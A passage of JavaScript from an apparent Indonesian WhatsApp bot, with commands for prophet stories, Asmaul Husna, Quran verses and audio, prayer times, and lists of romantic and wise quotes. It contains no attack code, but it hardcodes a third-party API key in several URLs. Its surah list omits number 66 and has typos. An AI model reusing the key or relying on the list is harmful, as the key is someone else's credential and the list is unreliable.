if (!text) return m.reply(`Ketik nama Nabi\nContoh : ${prefix+command} Muhammad`) 
try{
let tod = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${text}?apikey=GataDios`)//perlu ganti
const name = tod.result.name
const ultah = tod.result.thn_kelahiran
const umur = tod.result.age
const asal = tod.result.place
const cerita = tod.result.story
var kisah = `_*Kisah Nabi*_
Nama Nabi : ${name}
Hari Kelahiran : ${ultah}
Wafat Pada Umur : ${umur}
Asal : ${asal}

Kisah Nabi *${name}* :
${cerita}`
m.reply(kisah) 
}catch (error) {
m.reply(`Ketik Nama Nabi Yang Valid`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'asmaulhusna':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=GataDios`)//perlu ganti 
const ke = tod.result.index
const latin = tod.result.latin
const arab = tod.result.ar
const indo = tod.result.id
const english = tod.result.en
var asmaul = `_*Random Asmaul Husna*_
Asmaul Husna Ke : ${ke}
Teks Arab : ${arab}
Teks Latin : ${latin}
Arti Dalam Bahasa Indonesia : ${indo}
Arti Dalam Bahasa Inggris : ${english}`
m.reply(asmaul) 
}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'listsurah': case 'listsurat':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
var surah = `_*List Surah*_

1. Al Fatihah (Pembuka)
2. Al Baqarah (Sapi Betina)
3. Ali Imran (Keluarga Imran)
4. An Nisa (Wanita)
5. Al Ma'idah (Jamuan)
6. Al An'am (Hewan Ternak)
7. Al-A'raf (Tempat yang Tertinggi)
8. Al-Anfal (Harta Rampasan Perang)
9. At-Taubah(Pengampunan)
10. Yunus (Nabi Yunus)
11. Hud (Nabi Hud)
12. Yusuf (Nabi Yusu)
13. Ar-Ra'd (Guruh)
14. Ibrahim (Nabi Ibrahim)
15. Al-Hijr (Gunung Al Hijr)
16. An-Nahl (Lebah)
17. Al-Isra' (Perjalanan Malam)
18. Al-Kahf (Penghuni-penghuni Gua)
19. Maryam (Maryam)
20. Ta Ha (Ta Ha)
21. Al-Anbiya (Nabi-Nabi)
22. Al-Hajj (Haji)
23. Al-Mu'minun (Orang-orang mukmin)
24. An-Nur (Cahaya)
25. Al-Furqan (Pembeda)
26. Asy-Syu'ara' (Penyair)
27. An-Naml (Semut)
28. Al-Qasas (Kisah-kisah)
29. Al-'Ankabut (Laba-laba)
30. Ar-Rum (Bangsa Romawi)
31. Luqman (Keluarga Luqman)
32. As-Sajdah (Sajdah)
33. Al-Ahzab (Golongan-golongan yang Bersekutu)
34. Saba' (Kaum Saba')
35. Fatir (Pencipta)
36. Ya Sin (Yaasiin)
37. As-Saffat (Barisan-barisan)
38. Sad (Shaad)
39. Az-Zumar (Rombongan-rombongan)
40. Ghafir (Yang Mengampuni)
41. Fussilat (Yang Dijelaskan)
42. Asy-Syura (Musyawarah)
43. Az-Zukhruf (Perhiasan)
44. Ad-Dukhan (Kabut)
45. Al-Jasiyah (Yang Bertekuk Lutut)
46. Al-Ahqaf (Bukit-bukit Pasir)
47. Muhammad (Nabi Muhammad)
48. Al-Fath (Kemenangan)
49. Al-Hujurat (Kamar-kamar)
50. Qaf (Qaaf)
51. Az-Zariyat (Angin yang Menerbangkan)
52. At-Tur (Bukit)
53. An-Najm (Bintang)
54. Al-Qamar (Bulan)
55. Ar-Rahman (Yang Maha Pemurah)
56. Al-Waqi'ah (Hari Kiamat)
57. Al-Hadid (Besi)
58. Al-Mujadilah (Wanita yang Mengajukan Gugatan)
59. Al-Hasyr (Pengusiran)
60. Al-Mumtahanah (Wanita yang Diuji)
61. As-Saff (Satu Barisan)
62. Al-Jumu'ah (Hari Jum'at)
63. Al-Munafiqun (Orang-orang yang Munafik)
64. At-Tagabun (Hari Dinampakkan Kesalahan-kesalahan)
65. At-Talaq (Talak)
67. Al-Mulk (Kerajaan)
68. Al-Qalam (Pena)
69. Al-Haqqah (Hari Kiamat)
70. Al-Ma'arij (Tempat Naik)
71. Nuh (Nabi Nuh)
72. Al-Jinn (Jin)
73. Al-Muzzammil (Orang yang Berselimut)
74. Al-Muddassir (Orang yang Berkemul)
75. Al-Qiyamah (Kiamat)
76. Al-Insan (Manusia)
77. Al-Mursalat (Malaikat-Malaikat Yang Diutus)
78. An-Naba' (Berita Besar)
79. An-Nazi'at (Malaikat-Malaikat Yang Mencabut)
80. 'Abasa (Ia Bermuka Masam)
81. At-Takwir (Menggulung)
82. Al-Infitar (Terbelah)
83. Al-Tatfif (Orang-orang yang Curang)
84. Al-Insyiqaq (Terbelah)
85. Al-Buruj (Gugusan Bintang)
86. At-Tariq (Yang Datang di Malam Hari)
87. Al-A'la (Yang Paling Tinggi)
88. Al-Gasyiyah (Hari Pembalasan)
89. Al-Fajr (Fajar)
90. Al-Balad (Negeri)
91. Asy-Syams (Matahari)
92. Al-Lail (Malam)
93. Ad-Duha (Waktu Matahari Sepenggalahan Naik (Dhuha))
94. Al-Insyirah (Melapangkan)
95. At-Tin (Buah Tin)
96. Al-'Alaq (Segumpal Darah)
97. Al-Qadr (Kemuliaan)
98. Al-Bayyinah (Pembuktian)
99. Az-Zalzalah (Kegoncangan)
100. Al-'Adiyat (Berlari Kencang)
101. Al-Qari'ah (Hari Kiamat)
102. At-Takasur (Bermegah-megahan)
103. Al-'Asr (Masa)
104. Al-Humazah (Pengumpat)
105. Al-Fil (Gajah)
106. Quraisy (Suku Quraisy)
107. Al-Ma'un (Barang-barang yang Berguna)
108. Al-Kausar (Nikmat yang Berlimpah)
109. Al-Kafirun (Orang-orang Kafir)
110. An-Nasr (Pertolongan)
111. Al-Lahab (Gejolak Api)
112. Al-Ikhlas (Ikhlas)
113. Al-Falaq (Waktu Subuh)
114. An-Nas (Umat Manusia)

`
m.reply(surah) 
}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'randomquran':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/randomquran?apikey=${setting.BotKey}`)//perlu ganti
const audio = tod.result.resources.ayah.audio.primary
const nama = tod.result.resources.nameOfSurah.long
const latin = tod.result.resources.nameOfSurah.transliteration.id
const nomer = tod.result.resources.numberOfSurah
const juz = tod.result.resources.ayah.meta.juz
const ayat = tod.result.resources.totalAyah
const ayatke = tod.result.resources.numberOfAyah
const teks = tod.result.resources.ayah.text.arab
const trans = tod.result.resources.ayah.text.transliteration.en
const artiid = tod.result.resources.ayah.translation.id
const artien = tod.result.resources.ayah.translation.en
const tafsir = tod.result.resources.ayah.tafsir.id.long
var quran = `_*Random Quran*_
Quran : ${nama}
Teks Latin : ${latin}
Surat Ke : ${nomer}
Juz : ${juz}
Total Ayat : ${ayat}
Ayat Ke : ${ayatke}

Isi Ayat : ${teks}

Latin : ${trans}

Arti Dalam Bahasa Indonesia : ${artiid}

Arti Dalam Bahasa Inggris : ${artien}

Tafsir Surah : ${tafsir}`
await m.reply(quran) 
await m.reply('Tunggu Sebentar Audio Sedang Dikirim') 
await juna.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'randomquran2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Masukkan Juznya\nContoh : ${prefix+command} 1`) 
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/randomquran2?juz=${text}&apikey=${setting.BotKey}`)//perlu ganti 
const audio = tod.result.resources.ayah.audio.primary
const nama = tod.result.resources.nameOfSurah.long
const latin = tod.result.resources.nameOfSurah.transliteration.id
const nomer = tod.result.resources.numberOfSurah
const juz = tod.result.resources.ayah.meta.juz
const ayat = tod.result.resources.totalAyah
const ayatke = tod.result.resources.numberOfAyah
const teks = tod.result.resources.ayah.text.arab
const trans = tod.result.resources.ayah.text.transliteration.en
const artiid = tod.result.resources.ayah.translation.id
const artien = tod.result.resources.ayah.translation.en
const tafsir = tod.result.resources.ayah.tafsir.id.long
var quran = `_*Random Quran*_
Quran : ${nama}
Teks Latin : ${latin}
Surat Ke : ${nomer}
Juz : ${juz}
Total Ayat : ${ayat}
Ayat Ke : ${ayatke}

Isi Ayat : ${teks}

Latin : ${trans}

Arti Dalam Bahasa Indonesia : ${artiid}

Arti Dalam Bahasa Inggris : ${artien}

Tafsir Surah : ${tafsir}`
await m.reply(quran) 
await m.reply('Tunggu Sebentar Audio Sedang Dikirim') 
await juna.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'jadwalsholat': case 'sholat': {
if (!text) return m.reply(`Masukkan Wilayah-nya\nContoh : ${prefix+command} Semarang`)  
try{
const res = await jadwalsholat(text)
    m.reply(`
Jadwal Sholat *${text}*

${Object.entries(res.today).map(([name, data]) => `*Sholat ${name}:* ${data}`).join('\n').trim()}
`.trim())
}catch (error) {
m.reply(`Masukan Daerah Yang Valid`)
}
}
break
case 'quranaudio': case 'alquranaudio': {//fix bug
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Masukkan Suratnya\nContoh : ${prefix+command} 1\n\nKetik .listsurah Untuk Melihat Daftar Surat`)  
try{
await m.reply('Tunggu Sebentar Audio Sedang Dikirim') 
await juna.sendMessage(m.chat, {audio : {url : `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=GataDios`}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
m.reply(`Maaf Terjadi Kesalahan`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'bucin': case 'quotesbucin':{//fix bug
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.lolhuman.xyz/api/random/katabucin?apikey=GataDios`)//perlu ganti 
const bucin = tod.result
juna.sendMessage(m.chat, {text: bucin}, {quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'dilan': case 'quotesdilan':{//fix bug
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=GataDios`)//perlu ganti
const dilan = tod.result
juna.sendMessage(m.chat, {text: dilan}, {quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
 case 'quotesanime':{//fix bug
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=GataDios`)//perlu ganti
const anime = tod.result.character
const quotes = tod.result.quote
juna.sendMessage(m.chat, {text: `${quotes}\n\n\n-By ${anime}`}, {quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
 break
case 'galau': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const galau = [
  'Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji',
  'Rasanya baru kemarin kamu menawariku seblak. Lalu entah mengapa hari ini menanyakan kabar pun tidak.\n~vinaa',
  "What's the point of us being close yesterday?\n~Vinaa",
  'Kamu tidak bisa memaksa seseorang untuk menomor satukan dirimu, sebab prioritas dengan kebutuhan itu jelas beda.\n*BY PUTRI*',
  'Hubungan kita hanya sampai dilisan, tidak sampai dipertemukan.\n*BY PUTRI*',
  'Dia sesuka hati, kamu setulus hati.\n*BY PUTRI*',
  'Mengakhiri bukan berarti tidak mau berjuang lagi...hanya saja aku tidak mau ada lgi,hati yg tersakiti.\n\nBy putri',
  'Maaf. Tidak ada waktu untuk meladeni gabutmu. Karena aku sibuk dengan kesibukan ku.\n*BY PUTRI*',
  'Pelangimu mungkin banyak warna. Tapi, tak ada warna yang membuat dia menaruh rasa.\n*BY PUTRI*',
  'Bahagia terus ya,sampai saat ini lu masih jadi tokoh favorit dikisah hidup gue,luv u.\n*BY PUTRI*',
  'Sorry,gue ga kuat buat semuanya ,mksi ya\n\n*BY PUTRI*',
  'Kamu memang sosok yg tak terduga Mudah membuat ku bahagia,mudah membuatku hancur saat itu juga.\n*BY PUTRI*',
  'Harusnya kalo udah ga sayang sama aku tu bilang aja gausa di tutup tutupin\n*BY INDI*',
  'Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu',
  'Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu',
  'Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu',
  'Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu',
  'Tak semudah itu melupakanmu',
  'Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya',
  'Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya',
  'Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya',
  'Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama',
  'Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya',
  'Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku',
  'Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati',
  'Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya',
  'Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu',
  'Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat',
  'Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya',
  'Tolong jangan pergi saat aku sudah sangat sayang padamu',
  'Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget',
  'Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu',
  'Sakit itu ketika cinta yang aku beri tidak kamu hargai',
  'Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu',
  'Karenamu aku jadi tau cinta yang sesungguhnya',
  'Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih',
  'Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai',
  'Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa',
  'Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis',
  'Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa',
  'Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama',
  'Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan',
  'Aku tak menyangka kamu pergi dan melupakan ku begitu cepat',
  'Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa',
  'Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku',
  'Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia',
  'Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali',
  'Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu',
  'Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu',
  'Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri',
  'Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku',
  'Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka',
  'Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu',
  'Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan',
  'Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina',
  'Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri',
  'Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja',
  'Aku berdiri disini sendiri menunggu kehadiran dirimu',
  'Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran',
  'Maaf aku lupa ternyata aku bukan siapa-siapa',
  'Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu',
  'Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku',
  'Jangan buat aku terlalu berharap jika kamu tidak menginginkanku',
  'Lebih baik sendiri daripada berdua tapi tanpa kepastian',
  'Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri',
  'Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar',
  'Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi',
  'Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki',
  'Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu',
  'Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau',
  'Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa',
  'Aku bukan mencari yang sempurna tapi yang terbaik untukku',
  'Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan',
  'Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka',
  'Terima kasih karena kamu aku menjadi lupa tentang masa laluku',
  'Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja',
  'Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati',
  'Mikirin orang yang gak pernah mikirin kita itu emang bikin gila',
  'Dari sekian lama menunggu apa yang sudah didapat',
  'Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali',
  'Yang sendiri adalah yang bersabar menunggu pasangan sejatinya',
  'Aku terlahir sederhana dan ditinggal sudah biasa',
  'Aku sayang kamu tapi aku masih takut untuk mencintaimu',
  'Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia',
  'Aku tidak pernah berpikir kamu akan menjadi yang sementara',
  'Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah',
  'Jangan paksa aku menjadi cewek seperti seleramu',
  'Dia menyukaimu namun sayang, kau dan dia berbeda agama',
  'Hanya yang sabar yang mampu melewati semua kekecewaan',
  'Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri',
  'Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu',
  'Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu',
  'Punya kalimat sendiri & mau ditambahin? chat *.owner*'
]
const galaunya = galau[Math.floor(Math.random() * galau.length)]
m.reply(`${galaunya}`)
const so = ['galau1', 'galau2', 'galau3', 'galau4','galau5','galau6','galau7','galau8']
const ga = so[Math.floor(Math.random() * so.length)]
backsoundnya = fs.readFileSync(`./media/sound/${ga}.mp3`)
juna.sendMessage(m.chat, {audio: backsoundnya, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'katabijak': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const bijak = [
 "Jika tak cinta, katakan saja. Jangan memberi harapan hampa, karena seseorang akan terluka. Jangan manfaatkan cinta!",
 "Meski bersahabat, kalian tak hrs sll bersama. Miliki waktumu sendiri. Tapi jgn lupakan mrk ketika kalian menemukan cinta",
 "Jika dia mencintaimu, dia pasti menginginkan hubungan serius dgnmu, jk dia terus mempertahankanmu namun tak serius, lupakan",
 "Mewujudkan apa yang kita inginkan adalah hadiah terbesar yang kita terima dari lahir",
 "Bersama orang lain aku mungkin malu-malu, tapi kalau sudah bersama sahabat, aku berubah menjadi sangat gila!",
 "Jangan putus asa akan cinta, krn selalu ada seseorang yg akan tulus mencintaimu, meski kadang dia bukan yg kamu harapkan",
 "Saat suatu hubungan berakhir, bkn berarti dua orang berhenti saling mencintai. Mereka hanya berhenti saling menyakiti",
 "kebahagian akupun terasa sempurna bila alasan dibalik senyuman ibu adalah aku",
 "Kadang masalah adl sahabat terbaikmu. mrk buatmu jadi lebih kuat dan buatmu menempatkan Tuhan di sisimu yg paling dekat",
 "Sahabat tak sll menjadi Super Hero yg sll datang di saat kita butuhkan.. Namun sahabat akan sll datang di saat yg pas",
 "Begitu sulitnya mencari teman yg tak lupa kita ketika sudah tak lama berjumpa",
 "Tak ada kata terlambat tuk berubah. Masa lalu hanyalah pendewasaan diri. Hidupmu tak ditentukan orang lain tapi kamu!",
 "Pada saat kita merasa tidak perlu lagi untuk belajar, saat itu juga kita perlu belajar banyak tentang kerendahan hati",
 "Cinta sejati adl ketika dia mencintai org lain dan kamu masih mampu tersenyum, sambil berkata: aku turut bahagia untukmu",
 "Jangan terlalu memikirkan masa lalumu, kini mereka hanya kenangan. Tatap masa depanmu karena disanalah impian",
 "Sahabat sejati menangis saat kau pergi, sahabat palsu pergi saat kau menangis",
 "Cintai apapun yang ada didunia dengan sewajarnya. Karena apapun yang ada di dunia tak ada yang abadi",
 "Kalaulah anda tidak mampu untuk menggembirakan orang lain, janganlah pula anda menambah dukanya",
 "Saat suatu hubungan berakhir, bkn berarti dua orang berhenti saling mencintai. Mereka hanya berhenti saling menyakiti",
 "Rasa takut sering kali tidak beralasan",
 "Aku hanya manusia biasa, memiliki hidup yg biasa. Namun kehadiran dirimu mengubah segalanya, kau membuatku merasa sempurna",
 "Cinta yg dekat dan mesra, sering terbukti hambar setelah pernikahan. Maka lbh berhati-hatilah saat cintamu terpisah jarak",
 "Kesuksesan paling besar dalam hidup adalah bisa bangkit dari kegagalan",
 "Sahabat akan selalu menghampiri ketika seluruh dunia menjauh",
 "Terkadang terasa pesimis,namun bangkitkanlah dengan bayangkan euforia yg nanti kalian raih",
 "cinta itu aneh, kamu membencinya, tapi ketika dia katakan \"IloveYOU\", kamu tak bisa dustai hatimu yg menjawab 'MeToo'",
 "Hidup ini bukan hanya mencari yang terbaik, namun lebih kepada menerima kenyataan bahwa kamu adalah kamu",
 "jika kita menangis, tetapi teman hanya akan menemani kita saat bahagia saja. Jadi pilihlah teman sejati yaitu sahabat",
 "Jika kamu mencintai seseorang,cintailah dia apa adanya, bukan karena kamu ingin dia menjadi seperti yang kamu inginkan",
 "Agar bs bahagia, jgn hanya mencari hal yg bisa buatmu bahagia, tapi temukan yg membuatmu sedih dan berhenti melakukannya",
 "Karena ada satu ikatan yang tak mungkin putus, \"Persahabatan\"",
 "Tak peduli seperti apa hidupmu, kamu selalu punya pilihan untuk melihat dari sisi baiknya atau sisi buruknya",
 "Sesuatu yang menyenangkan bagaimana seseorang mampu membuatmu tersenyum, hanya dengan memikirkan dirinya",
 "Yang penting itu bukan apa yang kita ketahui tapi apa yang kita bersedia pelajari",
 "mencintai karena agama dan kebaikannya, kamu akan menemuakan kebahagian hidup bersamanya",
 "Jadi diri sendiri agar ketika ssorg mencintai, km tak perlu takut jika dia temukan dirimu bkn org yg ingin dia cintai",
 "Kelakukan kita terhadap kehidupan, menentukan sikap kehidupan terhadap kita",
 "Saat kamu harus memilih satu cinta aja, pasti ada orang lain yg menangis. #Anime (Ai Kora)",
 "Yang penting itu bukan apa yang kita ketahui tapi apa yang kita bersedia pelajari",
 "Sebenarnya tantangannya bukan me-manage waktu tapi me-manage diri kita sendiri",
 "Tuhan tidak akan mengambil sesuatu dari kita, melainkan Dia telah menyiapkan pengganti yang lebih baik",
 "Tak ada kata terlambat tuk berubah. Masa lalu hanyalah pendewasaan diri. Hidupmu tak ditentukan orang lain tapi kamu!",
 "Aku hanya manusia biasa, memiliki hidup yg biasa. Namun kehadiran dirimu mengubah segalanya, kau membuatku merasa sempurna",
 "Kamu takkan pernah kehilangan org yg kamu cintai jika kamu bersedia jadi sahabatnya, meski hubungan kalian telah berakhir",
 "Aku tak ingin hanya karena cinta, pertemanan kita usai",
 "Sahabat ibarat mata dan tangan, saat mata menangis tangan mengusap. Saat tangan terluka mata menangis",
 "Tidak peduli udah berapa banyak hubungan yg kita miliki, kita semua nanti akan sendirian. #Anime [Another]",
 "mencintai karena parasnya akan membuatmu merasa cepat bosan",
 "Emosi tidak akan membimbingmu pada suatu pemikiran atau tindakan positif. oleh sebab itu tenangkan dirimu",
 "Sadarilah, kamu itu tak pantas menangis krn dia yg mengkhianatimu",
 "Meskipun sulit utk dijalani kata kata mutiara bijak bisa kita jadikan pedoman hidup kita agar tidak salah dalam bertindak",
 "Hiduplah seakan-akan hari ini adalah hari terakhir kita. Belajarlah seakan-akan kita akan hidup selamanya",
 "Tiada yg lebih indah daripada kasih seorg sahabat, sahabat menaruh kasih di setiap waktu selalu ada dlm setiap kesukaran",
 "Kesederhanaan adalah pengalaman yang sangat berharga di dunia",
 "Cinta yg dekat dan mesra, sering terbukti hambar setelah pernikahan. Maka lbh berhati-hatilah saat cintamu terpisah jarak",
 "jgn yakinkan bahwa dia menyukaimu hanya krn dia bersikap manis padamu. Kadang kamu hanya sebuah pilihan ketika dia bosan"
]
const katabijak = bijak[Math.floor(Math.random() * bijak.length)]
m.reply(`${katabijak}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'katacinta': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const cinta = [
"Jangan pernah jatuh cinta saat hujan. Karena ketika besok lusa kamu patah-hati, setiap kali hujan turun, kamu akan terkenang dengan kejadian menyakitkan itu. Saat orang lain bahagia menatap hujan, kamu justru nelangsa sedih melihat keluar jendela.",
"Hampa itu seperti langkah tak berjejak, senja tapi tak jingga, cinta tapi tak dianggap.",
"Cinta selalu saja misterius. Jangan diburu-buru, atau kau akan merusak jalan ceritanya sendiri.",
"Cinta bukan mengajar kita lemah, tetapi membangkitkan kekuatan. Cinta bukan mengajar kita menghinakan diri, tetapi menghembuskan kegagahan. Cinta bukan melemahkan semangat, tetapi membangkitkan semangat.",
"Cinta itu perang, yakni perang yang hebat dalam rohani manusia. Jika ia menang, akan didapati orang yang tulus ikhlas, luas pikiran, sabar dan tenang hati. Jika ia kalah, akan didapati orang yang putus asa, sesat, lemah hati, kecil perasaan dan bahkan kadang-kadang hilang kepercayaan pada diri sendiri.",
"Jangan pernah jatuh cinta saat hujan. Karena ketika besok lusa kamu patah-hati, setiap kali hujan turun, kamu akan terkenang dengan kejadian menyakitkan itu. Saat orang lain bahagia menatap hujan, kamu justru nelangsa sedih melihat keluar jendela.",
"Cara dia ngelihat cinta akan berbeda semenjak patah hati itu.",
"Alasan tak berdaya dalam ekspresi cinta.",
"Kenapa tisue bermanfaat, karena cinta tak pernah kemarau.",
"Hampa itu seperti langkah tak berjejak, senja tapi tak jingga, cinta tapi tak dianggap.",
"Cara dia ngelihat cinta akan berbeda semenjak patah hati itu.",
"Pengecut terbesar adalah pria yang membangunkan cinta seorang wanita tanpa bermaksud untuk balas mencintainya.",
"Kenapa tisue bermanfaat, karena cinta tak pernah kemarau.",
"Cinta adalah perbuatan. Kata-kata dan tulisan indah adalah omong kosong.",
"Aku melihatmu dan melihat sisa hidupku di depan mataku.",
"Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.",
"Mengasihimu adalah kelemahan terbesar dan kekuatan terbesarku.",
"Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.",
"Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.",
"Aku butuh kamu seperti jantung butuh detak.",
"Jika kamu mencintai seseorang, bebaskanlah mereka. Jika mereka kembali maka ia milikmu. Jika tidak, tinggalkanlah.",
